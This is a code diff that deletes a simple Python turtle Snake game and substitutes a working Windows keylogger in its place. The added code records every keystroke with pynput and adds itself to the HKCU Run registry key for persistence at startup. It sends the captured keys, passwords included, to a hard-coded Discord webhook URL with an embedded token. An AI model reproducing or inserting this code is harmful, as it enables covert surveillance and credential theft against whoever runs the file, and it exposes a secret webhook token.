@@ -1,182 +1,32 @@
-import turtle
-import time
-import random
+ import pynput
+from pynput.keyboard import Key, Listener
+from discord_webhook import DiscordWebhook
+import winreg
+import sys
 
-delay = 0.1
+webhook_url = 'https://discord.com/api/webhooks/1343270745211408404/4oM9RWTBmVkr_d6aJBB1xZZ6JMdp7yz2GsBvAuDG6kne8bcd1I5vELjhJQbPiUlJ2-XV'     # Paste here your Webhook URL (instructions in README.md) 
+registry_name = 'Simple Discord Webhook Keylogger'     # Registry name for system startup execution
+keys_buffer = ''     # Create empty buffer variable *leave as it is*
 
+winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")     # Create registry key for automatic program execution after system startup
+registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)     # Open key for entry
+winreg.SetValueEx(registry_key, registry_name, 0, winreg.REG_SZ, sys.argv[0])     # Creating entry
+winreg.CloseKey(registry_key)     # Close key
 
-score = 0
-high_score = 0
+def send_message(message):
+    DiscordWebhook(url=webhook_url, content=message).execute()     # Send message using Webhook
 
+def on_press(key):     # Executes on each key pressed
+    global keys_buffer
+    if str(key)[:4] == 'Key.':     # Check if pressed key is not number, letter or character
+        key = ' [' + str(key) + ']'
+    else:
+        key = str(key)[1]
+    if len(keys_buffer) + len(key) >= 1975 or key == ' [Key.enter]':     # Check if keys_buffer exceeds Discord's 2000 characters per message limit or ENTER is pressed
+        send_message(keys_buffer + key)     # Send logged keys on Discord channel
+        keys_buffer = ''     # Reset keys_buffer to log new key presses
+    else:
+        keys_buffer += key     # Concatenate new logged key presses to make it look simpler
 
-wn = turtle.Screen()
-wn.title("Snake Game by @TokyoEdTech")
-wn.bgcolor("green")
-wn.setup(width=600, height=600)
-wn.tracer(0)
-
-
-head = turtle.Turtle()
-head.speed(0)
-head.shape("square")
-head.color("black")
-head.penup()
-head.goto(0,0)
-head.direction = "stop"
-
-
-food = turtle.Turtle()
-food.speed(0)
-food.shape("circle")
-food.color("red")
-food.penup()
-food.goto(0,100)
-
-segments = []
-
-
-pen = turtle.Turtle()
-pen.speed(0)
-pen.shape("square")
-pen.color("white")
-pen.penup()
-pen.hideturtle()
-pen.goto(0, 260)
-pen.write("Score: 0  High Score: 0", align="center", font=("Courier", 24, "normal"))
-
-
-def go_up():
-    if head.direction != "down":
-        head.direction = "up"
-
-def go_down():
-    if head.direction != "up":
-        head.direction = "down"
-
-def go_left():
-    if head.direction != "right":
-        head.direction = "left"
-
-def go_right():
-    if head.direction != "left":
-        head.direction = "right"
-
-def move():
-    if head.direction == "up":
-        y = head.ycor()
-        head.sety(y + 20)
-
-    if head.direction == "down":
-        y = head.ycor()
-        head.sety(y - 20)
-
-    if head.direction == "left":
-        x = head.xcor()
-        head.setx(x - 20)
-
-    if head.direction == "right":
-        x = head.xcor()
-        head.setx(x + 20)
-
-
-wn.listen()
-wn.onkeypress(go_up, "w")
-wn.onkeypress(go_down, "s")
-wn.onkeypress(go_left, "a")
-wn.onkeypress(go_right, "d")
-
-
-while True:
-    wn.update()
-
-    
-    if head.xcor()>290 or head.xcor()<-290 or head.ycor()>290 or head.ycor()<-290:
-        time.sleep(1)
-        head.goto(0,0)
-        head.direction = "stop"
-
-       
-        for segment in segments:
-            segment.goto(1000, 1000)
-        
-        
-        segments.clear()
-
-       
-        score = 0
-
-       
-        delay = 0.1
-
-        pen.clear()
-        pen.write("Score: {}  High Score: {}".format(score, high_score), align="center", font=("Courier", 24, "normal")) 
-
-
-   
-    if head.distance(food) < 20:
-        # Move the food to a random spot
-        x = random.randint(-290, 290)
-        y = random.randint(-290, 290)
-        food.goto(x,y)
-
-       
-        new_segment = turtle.Turtle()
-        new_segment.speed(0)
-        new_segment.shape("square")
-        new_segment.color("grey")
-        new_segment.penup()
-        segments.append(new_segment)
-
-      
-        delay -= 0.001
-
-       
-        score += 10
-
-        if score > high_score:
-            high_score = score
-        
-        pen.clear()
-        pen.write("Score: {}  High Score: {}".format(score, high_score), align="center", font=("Courier", 24, "normal")) 
-
-   
-    for index in range(len(segments)-1, 0, -1):
-        x = segments[index-1].xcor()
-        y = segments[index-1].ycor()
-        segments[index].goto(x, y)
-
-  
-    if len(segments) > 0:
-        x = head.xcor()
-        y = head.ycor()
-        segments[0].goto(x,y)
-
-    move()    
-
-   
-    for segment in segments:
-        if segment.distance(head) < 20:
-            time.sleep(1)
-            head.goto(0,0)
-            head.direction = "stop"
-        
-           
-            for segment in segments:
-                segment.goto(1000, 1000)
-        
-        
-            segments.clear()
-
-          
-            score = 0
-
-          
-            delay = 0.1
-        
-            
-            pen.clear()
-            pen.write("Score: {}  High Score: {}".format(score, high_score), align="center", font=("Courier", 24, "normal"))
-
-    time.sleep(delay)
-
-wn.mainloop()
+with Listener(on_press=on_press) as listener:
+    listener.join()     # Start the listener 
